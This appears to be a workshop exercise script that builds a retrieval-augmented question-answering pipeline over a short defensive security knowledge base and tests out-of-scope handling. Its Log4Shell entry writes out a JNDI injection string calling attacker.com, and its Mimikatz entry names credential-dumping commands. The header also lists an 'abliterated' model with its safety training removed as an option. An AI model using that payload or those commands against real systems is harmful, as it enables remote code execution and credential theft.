# Exercise 3 — The Full RAG Pipeline
#
# Combines embedding-based retrieval with LLM generation to answer
# security questions grounded in a knowledge base. Compares pure LLM
# output against RAG-augmented output and tests out-of-scope handling.
#
# Requires: pip install sentence-transformers
# Requires at least one API key:
#   set ANTHROPIC_API_KEY=...
#   set OPENAI_API_KEY=...
#   set GOOGLE_API_KEY=...
#   set OLLAMA_MODEL=huihui_ai/qwen3.5-abliterated:2B

import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
import sys
import os

# Import the shared LLM client (one directory up from )
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from llm_client import get_client

# Load embedding model (for retrieval) and LLM client (for generation)
embed_model = SentenceTransformer("all-MiniLM-L6-v2")

provider, llm_client = get_client()
if llm_client is None:
    print("No API key found. Set ANTHROPIC_API_KEY, OPENAI_API_KEY, or GOOGLE_API_KEY.")
    print("(Task 1 — building the augmented prompt — still works without an API key.)")

print(f"Embedding model: all-MiniLM-L6-v2")
if llm_client:
    print(f"LLM provider: {provider}")


# ============================================================
#   Knowledge Base
# ============================================================

KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
Unexpected access to lsass.exe from procdump, taskmgr, or unsigned binaries triggers high alerts.
Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged field.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1. Detection: outbound LDAP, jndi patterns in web logs.
""",
    "ransomware": """
Ransomware incident response phases:
Phase 1 (0-30 min): confirm indicators, find Patient Zero, do NOT reboot.
Phase 2: isolate via VLAN, disable accounts, block C2.
Phase 3: remove persistence, reset credentials, patch initial access vector.
Phase 4: restore from clean backups, monitor for re-infection.
""",
    "lateral_movement": """
Lateral movement detection: SMB anomalies (Event 4624 type 3), unusual RDP, PsExec/WMI execution.
Pass-the-Hash reuses NTLM hashes. Baseline admin behaviour to detect anomalies.
Alert when admin tools appear on non-admin workstations.
""",
    "phishing": """
Identify phishing by checking SPF/DKIM/DMARC, sender domain age, and URL redirect chains.
Hash attachments and check VirusTotal. Sandbox unknown executables.
Spear-phishing uses OSINT; BEC uses lookalike domains and urgency.
""",
    "network_segmentation": """
Segment: DMZ for internet-facing services, separate VLAN for OT/ICS, isolated network for DCs.
Zero-trust: verify every request, assume breach. Microsegmentation limits east-west traffic.
Document all segment boundaries and authorised communication paths.
""",
}

QUESTIONS = [
    "What Sysmon event ID should I monitor for credential dumping attacks?",
    "What are the first steps when ransomware is detected in my environment?",
    "How can I prevent lateral movement between network segments?",
]


# ============================================================
#   Index-building and retrieval helpers
# ============================================================

def build_index(kb):
    """Chunk all documents and encode into a vector index."""
    all_chunks = []
    for doc_id, text in kb.items():
        words = text.split()
        step = 50
        for i in range(0, len(words), step):
            chunk = " ".join(words[i:i + 60])
            if len(chunk.split()) >= 10:
                all_chunks.append((doc_id, chunk))
    texts = [c[1] for c in all_chunks]
    idx = embed_model.encode(texts)
    return all_chunks, idx


def retrieve(query, all_chunks, index, top_k=3):
    """Encode query and return top-k most similar chunks."""
    q = embed_model.encode([query])
    sims = cosine_similarity(q, index)[0]
    top = np.argsort(sims)[::-1][:top_k]
    return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top]


# Build the index once at startup
all_chunks, index = build_index(KNOWLEDGE_BASE)
print(f"Index built: {len(all_chunks)} chunks from {len(KNOWLEDGE_BASE)} documents\n")


# ============================================================
#   TASK 1: Build the augmented prompt
# ============================================================
print("=" * 60)
print("  TASK 1: Build the Augmented Prompt")
print("=" * 60)

# Retrieves top-k chunks and formats them into a system prompt
# with instructions to answer ONLY from the provided context.
def build_rag_prompt(query, top_k=3):
    results = retrieve(query, all_chunks, index, top_k=top_k)
    context = "\n\n".join(
        [f"[Source: {doc_id}]\n{chunk}" for score, doc_id, chunk in results]
    )
    return (
        "You are a security analyst assistant.\n"
        "Answer the user's question using ONLY the information in the context below.\n"
        "If the answer is not in the context, say 'I don't have that information in my knowledge base.'\n"
        "Always cite which [Source: ...] you used.\n\n"
        f"CONTEXT:\n{context}"
    )

print("\n=== Augmented prompt for question 1 ===")
print(build_rag_prompt(QUESTIONS[0]))


# ============================================================
#   TASK 2: Compare pure LLM vs RAG
# ============================================================
print("\n" + "=" * 60)
print("  TASK 2: Pure LLM vs RAG")
print("=" * 60)

# Same question sent with and without retrieved context.
# The RAG response should specifically mention "Sysmon Event ID 10".
if llm_client:
    print("\n=== Pure LLM (no context) ===")
    pure_resp = llm_client.chat(
        system="You are a security analyst assistant.",
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(pure_resp)

    print("\n=== RAG answer (with retrieved context) ===")
    rag_system = build_rag_prompt(QUESTIONS[0])
    rag_resp = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(rag_resp)
else:
    print("(Skipping Task 2 — no API key found)")


# ============================================================
#   TASK 3: Three-question Q&A session
# ============================================================
print("\n" + "=" * 60)
print("  TASK 3: 3-Question Q&A Session")
print("=" * 60)

# Runs all three questions through the full RAG pipeline.
# For each question, shows the retrieved sources and the answer.
if llm_client:
    print("\n=== 3-Question Q&A Session ===\n")
    for question in QUESTIONS:
        results = retrieve(question, all_chunks, index, top_k=3)
        sources = ", ".join(f"{doc_id} ({score:.2f})" for score, doc_id, _ in results)
        rag_system = build_rag_prompt(question, top_k=3)
        answer = llm_client.chat(
            system=rag_system,
            messages=[{"role": "user", "content": question}],
            max_tokens=250,
        )
        print(f"Q: {question}")
        print(f"Retrieved: {sources}")
        print(f"A: {answer}\n")
else:
    print("(Skipping Task 3 — no API key found)")


# ============================================================
#   TASK 4 (Bonus): Out-of-scope question
# ============================================================
print("=" * 60)
print("  TASK 4 (Bonus): Out-of-Scope Question")
print("=" * 60)

# When the knowledge base has no relevant info, the RAG system
# should refuse to answer rather than hallucinate.
if llm_client:
    OUT_OF_SCOPE = "What is the best antivirus software to buy in 2024?"
    print(f"\nQuery: {OUT_OF_SCOPE}")
    results = retrieve(OUT_OF_SCOPE, all_chunks, index, top_k=3)
    print("Retrieved chunks (low relevance expected):")
    for score, doc_id, chunk in results:
        print(f"  {score:.4f} | {doc_id} | {chunk[:60]}...")
    rag_system = build_rag_prompt(OUT_OF_SCOPE, top_k=3)
    answer = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": OUT_OF_SCOPE}],
        max_tokens=150,
    )
    print(f"\nRAG answer: {answer}")

print("\n--- Exercise 3 complete. RAG workshop finished! ---")
print("--- Open reference_solution.py to compare your implementation. ---")
